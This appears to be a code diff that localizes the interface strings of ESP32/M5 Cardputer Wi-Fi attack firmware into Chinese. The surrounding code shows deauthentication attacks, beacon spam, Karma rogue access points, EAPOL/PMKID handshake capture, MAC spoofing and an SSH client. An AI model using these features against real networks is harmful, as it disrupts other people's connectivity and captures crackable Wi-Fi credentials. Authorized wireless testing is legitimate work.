-        M5.Display.println("  Please wait...");
+        M5.Display.println("正在保存开放网络");
+        M5.Display.println("  请稍候...");
         createKarmaList(maxIndex);
       }
-      waitAndReturnToMenu("Stopping Wardriving.");
+      waitAndReturnToMenu("正在停止路测");
       Serial.println(F("-------------------"));
       Serial.println(F("Stopping Wardriving"));
       Serial.println(F("-------------------"));
@@ -10726,13 +10954,13 @@ void karmaSpear() {
   File karmaListFile = SD.open("/evil/KarmaList.txt", FILE_READ);
   if (!karmaListFile) {
     Serial.println(F("Error opening KarmaList.txt"));
-    waitAndReturnToMenu(" No KarmaFile.");
+    waitAndReturnToMenu(" 无Karma文件");
     return;
   }
   if (karmaListFile.available() == 0) {
     karmaListFile.close();
     Serial.println(F("KarmaFile empty."));
-    waitAndReturnToMenu(" KarmaFile empty.");
+    waitAndReturnToMenu(" Karma文件为空");
     return;
   }
   while (karmaListFile.available()) {
@@ -10745,7 +10973,7 @@ void karmaSpear() {
       displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);
       if (karmaSuccess) {
         karmaListFile.close();
-        waitAndReturnToMenu("return to menu");
+        waitAndReturnToMenu("返回菜单");
         return;
       }
       delay(200);
@@ -10754,7 +10982,7 @@ void karmaSpear() {
   karmaListFile.close();
   isAutoKarmaActive = false;
   Serial.println(F("Karma Spear Failed..."));
-  waitAndReturnToMenu("Karma Spear Failed...");
+  waitAndReturnToMenu("Karma鱼叉攻击失败...");
 }
 
 
@@ -10926,7 +11154,7 @@ void beaconSpamList(const char* list, size_t listSize){
 void beaconAttack(){
     WiFi.mode(WIFI_MODE_STA);
 
-    bool useCustomBeacons = confirmPopup("Use custom beacons?");
+    bool useCustomBeacons = confirmPopup("使用自定义信标?");
     M5.Display.clear();
 
     std::vector<String> customBeacons;
@@ -10937,9 +11165,9 @@ void beaconAttack(){
     // UI "Stop" en bas
     M5.Display.fillRect(0, M5.Display.height()-30, M5.Display.width(), 30, TFT_RED);
     M5.Display.setCursor(M5.Display.width()/2-24, M5.Display.height()-20);
-    M5.Display.setTextColor(TFT_WHITE); M5.Display.println("Stop");
+    M5.Display.setTextColor(TFT_WHITE); M5.Display.println("停止");
 
-    M5.Display.setCursor(10,18); M5.Display.println("Beacon Spam running..");
+    M5.Display.setCursor(10,18); M5.Display.println("信标洪水运行中..");
     Serial.println(F("-------------------\nStarting Beacon Spam\n-------------------"));
 
     while(!kp(KEY_ENTER) &&
@@ -10962,7 +11190,7 @@ void beaconAttack(){
 
     Serial.println(F("-------------------\nStopping Beacon Spam\n-------------------"));
     restoreOriginalWiFiSettings();
-    waitAndReturnToMenu("Beacon Spam Stopped..");
+    waitAndReturnToMenu("信标洪水已停止..");
 }
 
 // beacon spam end
@@ -10972,7 +11200,7 @@ void beaconAttack(){
 
 String getUserInput(bool isPassword = false, bool allowEmpty = false) {
   String input = "";
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
   M5.Display.setCursor(5, 30);
   while (true) {
@@ -11047,29 +11275,29 @@ Set WiFi password, ssid and mac address
 ============================================================================================================================
 */
 void setWifiSSID() {
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.clear();
   M5.Display.setCursor(5, 10);
-  M5.Display.println("Enter SSID:");
+  M5.Display.println("输入SSID:");
   M5.Display.display();
   enterDebounce();
   String nameSSID = getUserInput();
   cloneSSIDForCaptivePortal(nameSSID);
-  waitAndReturnToMenu("Set Wifi SSID :" + nameSSID);
+  waitAndReturnToMenu("已设SSID: " + nameSSID);
 }
 
 
 
 
 void setWifiPassword() {
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.clear();
   M5.Display.setCursor(5, 10);
-  M5.Display.println("Enter Password:");
+  M5.Display.println("输入密码:");
   M5.Display.setCursor(5, M5.Display.height() - 12);
-  M5.Display.setTextSize(1);
-  M5.Display.println("Should be greater than 8 or egal 0");
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1);
+  M5.Display.println("长度至少8位, 留空为开放网络");
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.display();
   enterDebounce();
   while (true) {
@@ -11078,37 +11306,37 @@ void setWifiPassword() {
       captivePortalPassword = newPassword;
       break;
     }
-    M5.Display.clear(); M5.Display.setCursor(5, 10); M5.Display.println("Password Error:");
-    M5.Display.setCursor(5, 30); M5.Display.println("Must be at least 8 characters");
-    M5.Display.println("   Or 0 for Open Network"); M5.Display.display(); delay(2000);
-    M5.Display.clear(); M5.Display.setCursor(5, 10); M5.Display.println("Enter Password:");
+    M5.Display.clear(); M5.Display.setCursor(5, 10); M5.Display.println("密码错误:");
+    M5.Display.setCursor(5, 30); M5.Display.println("必须至少8个字符");
+    M5.Display.println("   或留空设为开放网络"); M5.Display.display(); delay(2000);
+    M5.Display.clear(); M5.Display.setCursor(5, 10); M5.Display.println("输入密码:");
     M5.Display.display();
   }
-  waitAndReturnToMenu("Set Wifi Password :" + captivePortalPassword);
+  waitAndReturnToMenu("已设WiFi密码: " + captivePortalPassword);
 }
 
 void setMacAddress() {
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.clear();
   M5.Display.setCursor(5, 10);
-  M5.Display.println("Enter MAC Address:");
+  M5.Display.println("输入MAC地址:");
   M5.Display.setCursor(5, M5.Display.height() - 12);
-  M5.Display.setTextSize(1);
-  M5.Display.println("Format: XX:XX:XX:XX:XX:XX");
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1);
+  M5.Display.println("格式: XX:XX:XX:XX:XX:XX");
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.display();
   enterDebounce();
   String macAddress;
   while (true) {
     macAddress = getUserInput();
     if (isValidMacAddress(macAddress)) { setDeviceMacAddress(macAddress); break; }
-    M5.Display.clear(); M5.Display.setCursor(5, 10); M5.Display.println("MAC Address Error:");
-    M5.Display.setCursor(5, 30); M5.Display.println("Invalid format. Use:"); M5.Display.println("XX:XX:XX:XX:XX:XX");
+    M5.Display.clear(); M5.Display.setCursor(5, 10); M5.Display.println("MAC地址错误:");
+    M5.Display.setCursor(5, 30); M5.Display.println("格式无效, 请使用:"); M5.Display.println("XX:XX:XX:XX:XX:XX");
     M5.Display.display(); delay(2000);
-    M5.Display.clear(); M5.Display.setCursor(5, 10); M5.Display.println("Enter MAC Address:");
+    M5.Display.clear(); M5.Display.setCursor(5, 10); M5.Display.println("输入MAC地址:");
     M5.Display.display();
   }
-  waitAndReturnToMenu("Set MAC Address :" + macAddress);
+  waitAndReturnToMenu("已设MAC地址: " + macAddress);
 }
 
 // Helper function to validate MAC address format
@@ -11159,10 +11387,10 @@ void setDeviceMacAddress(String mac) {
     M5.Display.clear();
     M5.Display.setCursor(5, 10);
     if (resultAP == ESP_OK) {
-        M5.Display.println("MAC Address set for AP:");
+        M5.Display.println("已设置AP MAC地址:");
         M5.Display.println(mac);
     } else {
-        M5.Display.println("Error setting MAC Address");
+        M5.Display.println("设置MAC地址失败");
     }
     M5.Display.display();
 
@@ -11311,13 +11539,13 @@ void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
     // Affichage sur l'écran
     M5.Lcd.setTextColor(WHITE, BLACK);
     M5.Lcd.setCursor(0, M5.Display.height() / 3 - 14);
-    M5.Lcd.printf("Deauth Detected!");
+    M5.Lcd.printf("检测到去认证包!");
     M5.Lcd.setCursor(0, M5.Display.height() / 3 );
     M5.Lcd.printf("CH: %d RSSI: %d  ", ctrl.channel, ctrl.rssi);
     M5.Lcd.setCursor(0, M5.Display.height() / 3 + 14);
-    M5.Lcd.print("Send: "); printAddressLCD(senderAddr);
+    M5.Lcd.print("发送: "); printAddressLCD(senderAddr);
     M5.Lcd.setCursor(0, M5.Display.height() / 3 + 28);
-    M5.Lcd.print("Receive: "); printAddressLCD(receiverAddr);
+    M5.Lcd.print("接收: "); printAddressLCD(receiverAddr);
     nombreDeDeauth++;
     if (nombreDeDeauth < 999) {
       M5.Lcd.setCursor(M5.Display.width() - 90, 42);
@@ -11370,7 +11598,7 @@ void deauthDetect() {
   const unsigned long debounceDelay = 300;  // Delai de debounce en millisecondes
 
   M5.Display.clear();
-  M5.Lcd.setTextSize(1.5);
+  evilSetCnFont(M5.Lcd, 1.5);
   M5.Lcd.setTextColor(WHITE, BLACK);
 
   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
@@ -11386,10 +11614,10 @@ void deauthDetect() {
   int y_btns = 122;
 
   M5.Lcd.setCursor(x_btnA, y_btns);
-  M5.Lcd.println("Mode:m");
+  M5.Lcd.println("模式:m");
 
   M5.Lcd.setCursor(x_btnB, y_btns);
-  M5.Lcd.println("Back:ok");
+  M5.Lcd.println("返回:OK");
 
   if (!SD.exists("/evil/handshakes") && !SD.mkdir("/evil/handshakes")) {
     Serial.println(F("Fail to create /handshakes folder"));
@@ -11444,13 +11672,13 @@ void deauthDetect() {
 
     if (currentChannelDeauth != lastDisplayedChannelDeauth || autoChannelHop != lastDisplayedMode) {
       M5.Lcd.setCursor(0, 0);
-      M5.Lcd.printf("Channel: %d    \n", currentChannelDeauth);
+      M5.Lcd.printf("信道: %d    \n", currentChannelDeauth);
       lastDisplayedChannelDeauth = currentChannelDeauth;
     }
 
     if (autoChannelHop != lastDisplayedMode) {
       M5.Lcd.setCursor(0, 12);
-      M5.Lcd.printf("Mode: %s  \n", autoChannelHop ? "Auto" : "Static");
+      M5.Lcd.printf("模式: %s  \n", autoChannelHop ? "自动" : "固定");
       lastDisplayedMode = autoChannelHop;
     }
 
@@ -11465,7 +11693,7 @@ void deauthDetect() {
   esp_wifi_start();
   delay(100); // Petite pause pour s'assurer que tout est terminé
 
-  waitAndReturnToMenu("Stop detection...");
+  waitAndReturnToMenu("停止检测...");
 }
 
 
@@ -11656,7 +11884,7 @@ void deauthAttack(int networkIndex) {
     }
 
     String ssid = WiFi.SSID(networkIndex);
-    if (!confirmPopup("      Deauth attack on:\n      " + ssid)) {
+    if (!confirmPopup("      去认证攻击:\n      " + ssid)) {
         inMenu = true;
         drawMenu();
         return;
@@ -11673,7 +11901,7 @@ void deauthAttack(int networkIndex) {
     esp_wifi_set_mode(WIFI_MODE_STA);  // Set to station mode
     esp_wifi_start();  // Start Wi-Fi
 
-    if (confirmPopup("   Do you want to sniff\n          EAPOL ?")) {
+    if (confirmPopup("   是否同时嗅探\n          EAPOL ?")) {
         esp_wifi_set_promiscuous(true);
         esp_wifi_set_promiscuous_rx_cb(snifferCallbackDeauth);
     }
@@ -11700,7 +11928,7 @@ void deauthAttack(int networkIndex) {
 
     if (!bssid || channel <= 0) {
         Serial.println(F("Invalid AP - aborting attack"));
-        M5.Display.println("Invalid AP");
+        M5.Display.println("无效的AP");
         return;
     }
 
@@ -11713,7 +11941,7 @@ void deauthAttack(int networkIndex) {
     M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
     M5.Display.setCursor(M5.Display.width() / 2 - 24, M5.Display.height() - 16);
     M5.Display.setTextColor(TFT_WHITE);
-    M5.Display.println("Stop");
+    M5.Display.println("停止");
 
     M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
     M5.Display.setCursor(10, 20);
@@ -11721,10 +11949,10 @@ void deauthAttack(int networkIndex) {
     M5.Display.setCursor(10, 34);
     M5.Display.println("MAC: " + macAddress);
     M5.Display.setCursor(10, 48);
-    M5.Display.println("Channel : " + String(channel));
+    M5.Display.println("信道: " + String(channel));
 
     M5.Display.setCursor(10, 62);
-    M5.Display.print("Deauth sent: ");
+    M5.Display.print("已发去认证: ");
     Serial.println(F("-------------------"));
     Serial.println(F("Starting Deauth Attack"));
     Serial.println(F("-------------------"));
@@ -11747,7 +11975,7 @@ void deauthAttack(int networkIndex) {
             M5.Display.print(String(deauthCount));
 
             M5.Display.setCursor(10, 76);
-            M5.Display.print("Delay: " + String(delayTime) + "ms    ");
+            M5.Display.print("间隔: " + String(delayTime) + "ms    ");
 
             Serial.println(F("-------------------"));
             Serial.println("Deauth packet sent : " + String(deauthCount));
@@ -11782,7 +12010,7 @@ void deauthAttack(int networkIndex) {
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
 
-    waitAndReturnToMenu("Stopping Deauth Attack");
+    waitAndReturnToMenu("正在停止去认证攻击");
 }
 
 void sendDeauthPacket() {
@@ -11967,7 +12195,7 @@ void sendBroadcastDeauths() {
               Serial.println(mac_to_string(ap_mac_address).c_str());
 
               M5.Lcd.setCursor(M5.Display.width() / 2 - 83 , M5.Display.height() / 2 + 16);
-              M5.Lcd.printf("Sending Deauth to");
+              M5.Lcd.printf("正在发送去认证至");
 
               for (int i = 0; i < nbDeauthSend; i++) {
                 sendDeauthToClient(client_mac, ap_mac_address, channel);
@@ -12050,14 +12278,14 @@ void wifi_scan() {
   Serial.println(F("-----------------------------"));
   Serial.println(F("Scanning WiFi networks..."));
   ap_channels.clear();
-  const char* scanningText = "Scanning nearby networks..";
+  const char* scanningText = "正在扫描附近网络..";
   M5.Lcd.setCursor((M5.Lcd.width()-M5.Lcd.textWidth(scanningText))/2, M5.Display.height() - 12 );
   M5.Lcd.printf(scanningText);
 
   int n = WiFi.scanNetworks(false, false);
   if (n == 0) {
     Serial.println(F("No networks found"));
-    const char* failedText = "No AP Found.";
+    const char* failedText = "未找到AP";
     M5.Lcd.setCursor((M5.Lcd.width()-M5.Lcd.textWidth(failedText))/2, M5.Display.height() - 12 );
     M5.Lcd.setTextColor(TFT_RED);
     M5.Lcd.printf(failedText);
@@ -12196,7 +12424,7 @@ void promiscuous_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
     } else {
       Serial.println(F("Unknown AP"));
       M5.Lcd.setCursor(0 , M5.Display.height() - 8);
-      M5.Lcd.printf("EAPOL from Unknow                                 ");
+      M5.Lcd.printf("未知AP的EAPOL                                     ");
     }
     Serial.println(F("-----------------------------"));
 
@@ -12407,7 +12635,7 @@ void deauthClients() {
     }
 
   }
-  waitAndReturnToMenu("Stopping Sniffing...");
+  waitAndReturnToMenu("正在停止嗅探...");
 }
 
 
@@ -12679,10 +12907,10 @@ bool showPcapInfo(int index) {
   int hsCount = parsePcapMultiHS(path, entries, MAX_HS_PER_PCAP, hasBeacon);
 
   if (hsCount == 0 && !hasBeacon) {
-    if (confirmPopup("Corrupt PCAP\n" + entry + "\nDelete file?")) {
+    if (confirmPopup("PCAP文件损坏\n" + entry + "\n是否删除?")) {
       SD.remove(path.c_str());
       pcapFiles.erase(pcapFiles.begin() + index);
-      confirmPopup("Deleted:\n" + entry);
+      confirmPopup("已删除:\n" + entry);
     }
     return true;  /* signal caller: file was bad (deleted or not) */
   }
@@ -12703,13 +12931,13 @@ bool showPcapInfo(int index) {
   }
 
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setCursor(5, 0);
   M5.Display.printf("[%d/%d] %s", realIdx + 1, realCount, entry.c_str());
 
   int y = 14;
   M5.Display.setCursor(5, y); y += 12;
-  M5.Display.printf("Beacon:%s  APs:%d  Valid:%d\n", hasBeacon?"Y":"N", hsCount, validCount);
+  M5.Display.printf("信标:%s  AP:%d  有效:%d\n", hasBeacon?"有":"无", hsCount, validCount);
 
   /* Show each AP found (compact: max ~6 lines on Cardputer screen) */
   int maxShow = min(hsCount, 5);
@@ -12730,11 +12958,11 @@ bool showPcapInfo(int index) {
   }
   if (hsCount > maxShow) {
     M5.Display.setCursor(5, y); y += 11;
-    M5.Display.printf("... +%d more\n", hsCount - maxShow);
+    M5.Display.printf("... 另有 %d 个\n", hsCount - maxShow);
   }
   if (hsCount == 0) {
     M5.Display.setCursor(5, y); y += 11;
-    M5.Display.println("No EAPOL found");
+    M5.Display.println("未找到EAPOL");
   }
 
   /* Status bar */
@@ -12744,7 +12972,7 @@ bool showPcapInfo(int index) {
   /* Navigation hints */
   M5.Display.setCursor(5, M5.Display.height() - 10);
   M5.Display.setTextColor(TFT_DARKGREY, TFT_BLACK);
-  M5.Display.printf("[;]prev [.]next [bk]back");
+  M5.Display.printf("[;]上页 [.]下页 [退格]返回");
   M5.Display.setTextColor(WHITE, TFT_BLACK);
 
   M5.Display.display();
@@ -12828,9 +13056,9 @@ void analyzeAllPcaps() {
   int emptyFiles  = 0;
 
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setCursor(5, 0);
-  M5.Display.println("Analyzing ALL PCAPs...");
+  M5.Display.println("正在分析所有PCAP...");
   M5.Display.display();
   delay(300);
 
@@ -12858,32 +13086,32 @@ void analyzeAllPcaps() {
 
     if ((i % 3) == 0) {
       M5.Display.setCursor(5, 18);
-      M5.Display.printf("Checked: %d/%d   \n", (int)i, (int)(pcapFiles.size() - 1));
+      M5.Display.printf("已检查: %d/%d   \n", (int)i, (int)(pcapFiles.size() - 1));
       M5.Display.display();
       esp_task_wdt_reset();
     }
   }
 
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setCursor(5, 0);
-  M5.Display.println("ALL PCAPs Summary");
+  M5.Display.println("全部PCAP汇总");
 
   int y = 18;
   M5.Display.setCursor(5, y); y += 14;
-  M5.Display.printf("Files : %d (%d empty)\n", totalFiles, emptyFiles);
+  M5.Display.printf("文件数: %d (%d 个空)\n", totalFiles, emptyFiles);
 
   M5.Display.setCursor(5, y); y += 14;
-  M5.Display.printf("APs   : %d\n", totalAPs);
+  M5.Display.printf("AP总数: %d\n", totalAPs);
 
   M5.Display.setCursor(5, y); y += 14;
-  M5.Display.printf("Valid : %d (4Way+PMKID)\n", validAPs);
+  M5.Display.printf("有效数: %d (4Way+PMKID)\n", validAPs);
 
   M5.Display.setCursor(5, y); y += 14;
   M5.Display.printf("PMKID : %d\n", pmkidAPs);
 
   M5.Display.setCursor(5, y); y += 14;
-  M5.Display.printf("Invalid: %d\n", invalidAPs);
+  M5.Display.printf("无效数: %d\n", invalidAPs);
 
   uint16_t borderColor = (validAPs > 0) ? TFT_GREEN : TFT_RED;
   M5.Display.drawRect(0, y, M5.Display.width(), 2, borderColor);
@@ -12919,7 +13147,7 @@ void loadPcapFiles(){
 void displayPcapList(){
   const int h=18, win=M5.Display.height()/h;
   int s=max(0,min(currentListIndexPcap,int(pcapFiles.size())-win));
-  M5.Display.clear(); M5.Display.setTextSize(1.5);
+  M5.Display.clear(); evilSetCnFont(M5.Display, 1.5);
   for(int i=s;i<min(int(pcapFiles.size()),s+win);++i){
     if(i==currentListIndexPcap){
       M5.Display.fillRect(0,(i-s)*h,M5.Display.width(),h,menuSelectedBackgroundColor);
@@ -12968,7 +13196,7 @@ void checkHandshakes(){
 
     /* retour Menu général */
     if(kp(KEY_BACKSPACE)){
-      waitAndReturnToMenu("Return to menu");
+      waitAndReturnToMenu("返回菜单");
       return;
     }
   }
@@ -13112,10 +13340,10 @@ void wofDrawHeader(bool force = false) {
   if (!force && (now - wofLastHeaderUpdate) < 250) return;
   wofLastHeaderUpdate = now;
   M5.Display.fillRect(0, 0, 240, WOF_HDR_H, WOF_ACCENT);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(TFT_BLACK, WOF_ACCENT);
   M5.Display.setCursor(6, 4);
-  M5.Display.print("Wall of Flippers");
+  M5.Display.print("Flipper监控墙");
   char buf[40];
   snprintf(buf, sizeof(buf), "OK:%d  SP:%d", wofValidCount, wofSpoofCount);
   int w = M5.Display.textWidth(buf);
@@ -13140,7 +13368,7 @@ void wofDrawList(bool force = false) {
   }
 
   M5.Display.fillRect(0, WOF_LIST_Y, 240, WOF_LIST_H, WOF_BG);
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   for (int row = 0; row < WOF_VISIBLE; ++row) {
     int idx = wofTop + row;
     if (idx >= wofCount) break;
@@ -13175,10 +13403,10 @@ void wofDrawSpamBox(bool force = false) {
   wofLastSpamUpdate = now;
   int y = 135 - WOF_SPAM_H;
   M5.Display.drawRoundRect(3, y, 234, WOF_SPAM_H - 4, 5, WOF_MUTED);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(WOF_MUTED, WOF_BG);
   M5.Display.setCursor(10, y + 2);
-  M5.Display.print("BLE Frames (last 2)");
+  M5.Display.print("BLE帧 (最近2条)");
   M5.Display.fillRect(5, y + 14, 230, WOF_SPAM_H - 20, WOF_BG);
   M5.Display.setTextColor(WOF_TEXT, WOF_BG);
   int lineY = y + 18;
@@ -13318,10 +13546,10 @@ void wofHandleKeys(bool& shouldExit) {
 void wallOfFlipper() {
   bool exitRequested = false;
   wofResetUI();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setTextColor(WOF_TEXT, WOF_BG);
   M5.Display.setCursor(8, WOF_LIST_Y + 4);
-  M5.Display.print("Scan BLE en cours...");
+  M5.Display.print("正在扫描BLE...");
   initializeBLEIfNeeded();
   delay(120);
   enterDebounce();
@@ -13335,7 +13563,7 @@ void wallOfFlipper() {
     wofDrawSpamBox(false);
   }
   releaseBLE();
-  waitAndReturnToMenu("Stop detection...");
+  waitAndReturnToMenu("停止检测...");
 }
 
 
@@ -13354,7 +13582,7 @@ bool connectToWiFi(const String& ssid, const String& password) {
 
   M5.Display.clear();
   M5.Display.setCursor(5, 10);
-  M5.Display.println("Connecting to WiFi...");
+  M5.Display.println("正在连接WiFi...");
   M5.Display.display();
 
   Serial.print(F("Connecting to SSID: "));
@@ -13372,7 +13600,7 @@ bool connectToWiFi(const String& ssid, const String& password) {
     Serial.println(F("WiFi connected successfully!"));
     M5.Display.clear();
     M5.Display.setCursor(5, 10);
-    M5.Display.println("Connected!");
+    M5.Display.println("已连接!");
     M5.Display.setCursor(5, 30);
     M5.Display.println("IP: " + WiFi.localIP().toString());
     M5.Display.display();
@@ -13382,9 +13610,9 @@ bool connectToWiFi(const String& ssid, const String& password) {
     Serial.println(F("Failed to connect to WiFi."));
     M5.Display.clear();
     M5.Display.setCursor(5, 10);
-    M5.Display.println("Failed to connect.");
+    M5.Display.println("连接失败");
     M5.Display.setCursor(5, 30);
-    M5.Display.println("Please try again.");
+    M5.Display.println("请重试");
     M5.Display.display();
     delay(2000); // Affiche le message pendant 2 secondes
     return false;
@@ -13396,13 +13624,13 @@ void connectWifi(int networkIndex) {
   Serial.println(F("Starting WiFi connection process..."));
 
   if (WiFi.localIP().toString() != "0.0.0.0") {
-    if (confirmPopup("You want to disconnect ?")) {
+    if (confirmPopup("是否断开当前连接?")) {
       Serial.println(F("Disconnecting from current WiFi..."));
       WiFi.disconnect(true);
-      waitAndReturnToMenu("Disconnected");
+      waitAndReturnToMenu("已断开连接");
       return;
     } else {
-      waitAndReturnToMenu("Stay connected...");
+      waitAndReturnToMenu("保持连接...");
       return;
     }
   }
@@ -13417,10 +13645,10 @@ void connectWifi(int networkIndex) {
   if (getWifiSecurity(networkIndex) == "Open") {
     Serial.println(F("Network is open, no password required."));
     if (connectToWiFi(nameSSID, "")) {
-      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
+      waitAndReturnToMenu("已连接WiFi: " + nameSSID);
       ssid = nameSSID; // Stocke le SSID sélectionné
     } else {
-      waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
+      waitAndReturnToMenu("连接WiFi失败: " + nameSSID);
     }
     return;
   }
@@ -13429,7 +13657,7 @@ void connectWifi(int networkIndex) {
   if (ssid == nameSSID) {
     Serial.println(F("Previously connected to this network. Trying saved password..."));
     if (connectToWiFi(nameSSID, password)) {
-      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
+      waitAndReturnToMenu("已连接WiFi: " + nameSSID);
       return;
     } else {
       Serial.println(F("Failed to connect with saved password, asking for a new one..."));
@@ -13439,15 +13667,15 @@ void connectWifi(int networkIndex) {
   // Demander le mot de passe pour les réseaux sécurisés
   M5.Display.clear();
   M5.Display.setCursor(5, 10);
-  M5.Display.println("Enter Password for " + nameSSID + " :");
+  M5.Display.println("输入 " + nameSSID + " 密码:");
   M5.Display.display();
   enterDebounce();
   typedPassword = getUserInput(false, true);
   Serial.print(F("Attempting to connect to WiFi with password: ")); Serial.println(typedPassword);
   if (connectToWiFi(nameSSID, typedPassword)) {
-    waitAndReturnToMenu("Connected to WiFi: " + nameSSID); ssid = nameSSID; password = typedPassword;
+    waitAndReturnToMenu("已连接WiFi: " + nameSSID); ssid = nameSSID; password = typedPassword;
   } else {
-    waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
+    waitAndReturnToMenu("连接WiFi失败: " + nameSSID);
   }
 }
 
@@ -13464,14 +13692,14 @@ void testConnectivity(const char *host) {
   M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
   M5.Display.setCursor(5, 10);
   Serial.println(F("Pinging Host..."));
-  M5.Display.print("Pinging: " + String(host));
+  M5.Display.print("正在Ping: " + String(host));
   if (Ping.ping(host)) {
     M5.Display.setCursor(5, 10);
     Serial.println(F("Ping successfull"));
-    M5.Display.println("Ping successfull                            ");
+    M5.Display.println("Ping成功                                    ");
   } else {
     M5.Display.setCursor(5, 10);
-    M5.Display.println("Ping Failed                                 ");
+    M5.Display.println("Ping失败                                    ");
     Serial.println(F("Ping failed"));
   }
 }
@@ -13490,7 +13718,7 @@ ssh_session connect_ssh(const char *host, const char *user, int port) {
   if (ssh_connect(session) != SSH_OK) {
     Serial.print(F("Error connecting to host"));
     M5.Display.setCursor(5, 10);
-    M5.Display.print("Error connecting to host");
+    M5.Display.print("连接主机出错");
     Serial.println(ssh_get_error(session));
     ssh_free(session);
     return NULL;
@@ -13504,7 +13732,7 @@ int authenticate_console(ssh_session session, const char *password) {
   if (rc != SSH_AUTH_SUCCESS) {
     Serial.print(F("Password error authenticating"));
     M5.Display.setCursor(5, 10);
-    M5.Display.print("Password error authenticating");
+    M5.Display.print("密码认证错误");
     Serial.println(ssh_get_error(session));
     return rc;
   }
@@ -13518,7 +13746,7 @@ void sshConnectTask(void *pvParameters) {
   if (my_ssh_session == NULL) {
     Serial.println(F("SSH Connection failed."));
     M5.Display.setCursor(5, 10);
-    M5.Display.print("SSH Connection failed.");
+    M5.Display.print("SSH连接失败");
     vTaskDelete(NULL);
     return;
   }
@@ -13526,7 +13754,7 @@ void sshConnectTask(void *pvParameters) {
   if (authenticate_console(my_ssh_session, ssh_password.c_str()) != SSH_OK) {
     Serial.println(F("SSH Authentication failed."));
     M5.Display.setCursor(5, 10);
-    M5.Display.print("SSH Authentication failed.");
+    M5.Display.print("SSH认证失败");
     ssh_disconnect(my_ssh_session);
     ssh_free(my_ssh_session);
     vTaskDelete(NULL);
@@ -13538,7 +13766,7 @@ void sshConnectTask(void *pvParameters) {
   if (my_channel == NULL || ssh_channel_open_session(my_channel) != SSH_OK) {
     Serial.println(F("SSH Channel open error."));
     M5.Display.setCursor(5, 10);
-    M5.Display.print("SSH Channel open error.");
+    M5.Display.print("SSH通道打开错误");
     ssh_disconnect(my_ssh_session);
     ssh_free(my_ssh_session);
     vTaskDelete(NULL);
@@ -13549,7 +13777,7 @@ void sshConnectTask(void *pvParameters) {
   if (ssh_channel_request_pty(my_channel) != SSH_OK || ssh_channel_request_shell(my_channel) != SSH_OK) {
     Serial.println(F("Request PTY/Shell failed."));
     M5.Display.setCursor(5, 10);
-    M5.Display.print("Request PTY/Shell failed.");
+    M5.Display.print("请求PTY/Shell失败");
     ssh_channel_close(my_channel);
     ssh_channel_free(my_channel);
     ssh_disconnect(my_ssh_session);
@@ -13561,7 +13789,7 @@ void sshConnectTask(void *pvParameters) {
 
   M5.Display.clear();
   M5.Display.setCursor(5, 10);
-  M5.Display.println("SSH Connection established.");
+  M5.Display.println("SSH连接已建立");
   M5.Display.display();
 
   xTaskCreatePinnedToCore(sshTask, "SSH Task", 16392, NULL, 1, NULL, 1);
@@ -13584,14 +13812,14 @@ void sshConnect(const char *host) {
    sshKilled = false;
   M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
   if (WiFi.localIP().toString() == "0.0.0.0") {
-    waitAndReturnToMenu("Not connected...");
+    waitAndReturnToMenu("未连接网络...");
     return;
   }
 
   if (host == nullptr) {
     // Demander à l'utilisateur s'il souhaite utiliser les informations stockées si elles ne sont pas vides
     if (ssh_user != "" && ssh_host != "" && ssh_password != "") {
-      if (confirmPopup("Use stored SSH details?")) {
+      if (confirmPopup("使用已保存的SSH信息?")) {
         // Utiliser les informations stockées
         Serial.print(F("Using stored SSH details: "));
         Serial.println("User: " + ssh_user + ", Host: " + ssh_host + ", Port: " + String(ssh_port));
@@ -13606,7 +13834,7 @@ void sshConnect(const char *host) {
     if (ssh_user == "" || ssh_host == "" || ssh_password == "") {
       M5.Display.clear();
       M5.Display.setCursor(5, 10);
-      M5.Display.println("Enter SSH User@Host:Port:");
+      M5.Display.println("输入SSH 用户@主机:端口:");
       String userHostPort = getUserInput();
       parseUserHostPort(userHostPort, ssh_user, ssh_host, ssh_port);
     }
@@ -13615,23 +13843,23 @@ void sshConnect(const char *host) {
     ssh_password = "";
     M5.Display.clear();
     M5.Display.setCursor(5, 10);
-    M5.Display.println("Enter SSH User:");
+    M5.Display.println("输入SSH用户名:");
     ssh_user = getUserInput();
 
     M5.Display.clear();
     M5.Display.setCursor(5, 10);
-    M5.Display.println("Enter SSH Port:");
+    M5.Display.println("输入SSH端口:");
     String portStr = getUserInput();
     ssh_port = portStr.toInt();
   }
   if (ssh_password == "") {
     M5.Display.clear();
